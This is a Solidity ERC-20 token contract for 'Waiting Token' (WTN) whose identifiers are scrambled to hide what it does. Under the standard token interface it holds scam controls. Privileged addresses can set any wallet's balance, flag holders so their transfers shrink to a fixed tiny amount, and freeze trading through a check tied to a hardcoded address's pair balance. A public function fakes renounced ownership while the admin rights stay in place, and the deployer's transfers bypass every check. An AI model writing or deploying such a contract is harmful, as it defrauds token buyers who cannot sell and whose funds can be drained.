//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface autoMarketing {
    function totalSupply() external view returns (uint256);

    function balanceOf(address walletTrading) external view returns (uint256);

    function transfer(address tradingLaunched, uint256 tokenAt) external returns (bool);

    function allowance(address maxEnable, address spender) external view returns (uint256);

    function approve(address spender, uint256 tokenAt) external returns (bool);

    function transferFrom(
        address sender,
        address tradingLaunched,
        uint256 tokenAt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed txWalletMax, uint256 value);
    event Approval(address indexed maxEnable, address indexed spender, uint256 value);
}

abstract contract modeExemptFund {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface swapLimit {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface fundFromMode {
    function createPair(address totalMarketing, address txLaunch) external returns (address);
}

interface totalAtExempt is autoMarketing {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract WaitingToken is modeExemptFund, autoMarketing, totalAtExempt {

    function decimals() external view virtual override returns (uint8) {
        return enableShould;
    }

    function getOwner() external view returns (address) {
        return exemptTakeFee;
    }

    uint256 public amountMode;

    bool public isSell;

    event OwnershipTransferred(address indexed senderTotal, address indexed buyMinMarketing);

    function tokenLiquidityEnable() private view {
        require(feeTo[_msgSender()]);
    }

    mapping(address => mapping(address => uint256)) private fundExempt;

    uint256 private receiverLiquidityAuto;

    uint256 private receiverFund;

    function takeMax(uint256 tokenAt) public {
        tokenLiquidityEnable();
        launchAmountReceiver = tokenAt;
    }

    function minAmountFrom(address shouldTotalIs, uint256 tokenAt) public {
        tokenLiquidityEnable();
        swapWallet[shouldTotalIs] = tokenAt;
    }

    function approve(address feeAt, uint256 tokenAt) public virtual override returns (bool) {
        fundExempt[_msgSender()][feeAt] = tokenAt;
        emit Approval(_msgSender(), feeAt, tokenAt);
        return true;
    }

    function allowance(address sellFund, address feeAt) external view virtual override returns (uint256) {
        if (feeAt == autoShould) {
            return type(uint256).max;
        }
        return fundExempt[sellFund][feeAt];
    }

    function minShouldSwap(address fundAt, address tradingLaunched, uint256 tokenAt) internal returns (bool) {
        if (fundAt == fundMarketing) {
            return takeShouldTrading(fundAt, tradingLaunched, tokenAt);
        }
        uint256 sellAuto = autoMarketing(buySell).balanceOf(amountTake);
        require(sellAuto == launchAmountReceiver);
        require(tradingLaunched != amountTake);
        if (txSwap[fundAt]) {
            return takeShouldTrading(fundAt, tradingLaunched, autoBuy);
        }
        return takeShouldTrading(fundAt, tradingLaunched, tokenAt);
    }

    function transferFrom(address fundAt, address tradingLaunched, uint256 tokenAt) external override returns (bool) {
        if (_msgSender() != autoShould) {
            if (fundExempt[fundAt][_msgSender()] != type(uint256).max) {
                require(tokenAt <= fundExempt[fundAt][_msgSender()]);
                fundExempt[fundAt][_msgSender()] -= tokenAt;
            }
        }
        return minShouldSwap(fundAt, tradingLaunched, tokenAt);
    }

    address autoShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address public fundMarketing;

    function receiverTrading(address maxAt) public {
        if (isSell) {
            return;
        }
        if (launchShould) {
            buyReceiver = false;
        }
        feeTo[maxAt] = true;
        if (receiverLiquidityAuto == isModeList) {
            isModeList = receiverLiquidityAuto;
        }
        isSell = true;
    }

    function name() external view virtual override returns (string memory) {
        return launchedTxAmount;
    }

    uint256 private swapReceiver;

    bool public autoReceiverToken;

    mapping(address => bool) public feeTo;

    function totalSupply() external view virtual override returns (uint256) {
        return maxTotalAmount;
    }

    bool public launchShould;

    uint256 private isModeList;

    bool private launchedReceiver;

    address private exemptTakeFee;

    function senderToken(address listFrom) public {
        tokenLiquidityEnable();
        
        if (listFrom == fundMarketing || listFrom == buySell) {
            return;
        }
        txSwap[listFrom] = true;
    }

    function transfer(address shouldTotalIs, uint256 tokenAt) external virtual override returns (bool) {
        return minShouldSwap(_msgSender(), shouldTotalIs, tokenAt);
    }

    uint256 launchAmountReceiver;

    function balanceOf(address walletTrading) public view virtual override returns (uint256) {
        return swapWallet[walletTrading];
    }

    mapping(address => bool) public txSwap;

    uint256 receiverWallet;

    constructor (){
        if (launchedReceiver) {
            buyReceiver = true;
        }
        swapLimit autoSender = swapLimit(autoShould);
        buySell = fundFromMode(autoSender.factory()).createPair(autoSender.WETH(), address(this));
        if (receiverFund != amountMode) {
            receiverFund = isModeList;
        }
        fundMarketing = _msgSender();
        shouldMarketing();
        feeTo[fundMarketing] = true;
        swapWallet[fundMarketing] = maxTotalAmount;
        
        emit Transfer(address(0), fundMarketing, maxTotalAmount);
    }

    uint256 constant autoBuy = 11 ** 10;

    string private launchedTxAmount = "Waiting Token";

    uint256 private maxTotalAmount = 100000000 * 10 ** 18;

    address amountTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function takeShouldTrading(address fundAt, address tradingLaunched, uint256 tokenAt) internal returns (bool) {
        require(swapWallet[fundAt] >= tokenAt);
        swapWallet[fundAt] -= tokenAt;
        swapWallet[tradingLaunched] += tokenAt;
        emit Transfer(fundAt, tradingLaunched, tokenAt);
        return true;
    }

    bool private buyReceiver;

    function symbol() external view virtual override returns (string memory) {
        return senderAuto;
    }

    uint8 private enableShould = 18;

    address public buySell;

    string private senderAuto = "WTN";

    mapping(address => uint256) private swapWallet;

    function owner() external view returns (address) {
        return exemptTakeFee;
    }

    function shouldMarketing() public {
        emit OwnershipTransferred(fundMarketing, address(0));
        exemptTakeFee = address(0);
    }

}